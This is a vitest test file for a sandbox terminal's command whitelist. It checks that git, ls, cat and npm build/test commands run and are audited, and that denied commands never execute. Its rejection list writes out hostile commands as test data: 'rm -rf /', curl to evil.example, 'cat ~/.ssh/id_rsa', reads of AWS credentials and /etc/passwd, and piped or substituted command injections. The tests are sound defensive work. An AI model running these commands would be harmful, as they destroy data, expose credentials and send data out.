// US-024: verifies the sandbox terminal whitelist policy and the run wrapper.
//   - whitelisted commands (git status/log/diff, ls, cat, npm run build/test,
//     node <script>) are allowed
//   - dangerous commands (rm -rf, curl, cat ~/.ssh, out-of-repo paths, shell
//     metacharacters) are rejected
//   - denied commands return a clear error, write change_log, and DO NOT execute
//   - allowed commands are audited and then executed
import { describe, it, expect, vi } from "vitest";

// terminal.ts imports db/client at module load; the live change_log writer is
// only used when deps aren't injected. Stub the client so no DATABASE_URL is
// needed and the schema import resolves.
vi.mock("@/lib/db/client", () => ({ db: {} }));

import {
  evaluateCommand,
  runTerminalCommand,
  type TerminalDeps,
} from "../terminal";

describe("evaluateCommand — whitelist allows", () => {
  it.each([
    "git status",
    "git log",
    "git diff",
    "git log --oneline -n 5",
    "ls",
    "ls src",
    "cat package.json",
    "cat src/lib/sandbox/terminal.ts",
    "npm run build",
    "npm run test",
    "node scripts/build.js",
  ])("allows %j", (cmd) => {
    const v = evaluateCommand(cmd);
    expect(v.allowed).toBe(true);
    expect(v.reason).toBe("");
  });
});

describe("evaluateCommand — dangerous commands rejected", () => {
  it.each([
    // destructive
    "rm -rf /",
    "rm -rf .",
    "rmdir node_modules",
    // network
    "curl http://evil.example/x",
    "wget http://evil.example/x",
    "nc -l 1234",
    "ssh user@host",
    // credential access
    "cat ~/.ssh/id_rsa",
    "cat ~/.aws/credentials",
    "cat .env",
    "cat .env.local",
    "cat secrets/server.pem",
    // out-of-repo / traversal
    "cat /etc/passwd",
    "ls ../../",
    "cat ../secret.txt",
    // off-whitelist git subcommands
    "git push",
    "git commit -m x",
    "git checkout main",
    // off-whitelist npm scripts
    "npm run deploy",
    "npm install",
    // shell metacharacters
    "git status | curl http://evil",
    "ls && rm -rf .",
    "cat $(echo /etc/passwd)",
    "echo hi > /tmp/x",
    // empty
    "",
    "   ",
  ])("rejects %j", (cmd) => {
    const v = evaluateCommand(cmd);
    expect(v.allowed).toBe(false);
    expect(v.reason.length).toBeGreaterThan(0);
  });
});

function makeDeps(over: Partial<TerminalDeps> = {}): {
  deps: TerminalDeps;
  audited: Array<{ command: string; allowed: boolean }>;
} {
  const audited: Array<{ command: string; allowed: boolean }> = [];
  const deps: TerminalDeps = {
    recordChangeLog: vi.fn(async ({ command, verdict }) => {
      audited.push({ command, allowed: verdict.allowed });
    }),
    execute: vi.fn(async () => ({
      stdout: "ok",
      stderr: "",
      exitCode: 0,
      timedOut: false,
    })),
    ...over,
  };
  return { deps, audited };
}

describe("runTerminalCommand", () => {
  it("executes an allowed command and audits it", async () => {
    const { deps, audited } = makeDeps();

    const res = await runTerminalCommand(
      { userId: "u1", command: "git status" },
      deps,
    );

    expect(res.allowed).toBe(true);
    expect(res.output?.stdout).toBe("ok");
    expect(deps.execute).toHaveBeenCalledWith("git", ["status"]);
    // change_log written, recording the allow.
    expect(audited).toEqual([{ command: "git status", allowed: true }]);
  });

  it("denies a dangerous command, returns a clear error, and does NOT execute", async () => {
    const { deps, audited } = makeDeps();

    const res = await runTerminalCommand(
      { userId: "u1", command: "rm -rf /" },
      deps,
    );

    expect(res.allowed).toBe(false);
    expect(res.error).toBeTruthy();
    expect(res.output).toBeUndefined();
    // The executor must never be touched on denial.
    expect(deps.execute).not.toHaveBeenCalled();
    // But the denial is still audited.
    expect(audited).toEqual([{ command: "rm -rf /", allowed: false }]);
  });

  it("denies cat ~/.ssh and never executes it", async () => {
    const { deps } = makeDeps();

    const res = await runTerminalCommand(
      { userId: "u1", command: "cat ~/.ssh/id_rsa" },
      deps,
    );

    expect(res.allowed).toBe(false);
    expect(res.error).toMatch(/path|credential/i);
    expect(deps.execute).not.toHaveBeenCalled();
  });

  it("denies network commands (curl) without executing", async () => {
    const { deps } = makeDeps();

    const res = await runTerminalCommand(
      { userId: "u1", command: "curl http://evil.example" },
      deps,
    );

    expect(res.allowed).toBe(false);
    expect(res.error).toMatch(/network/i);
    expect(deps.execute).not.toHaveBeenCalled();
  });
});
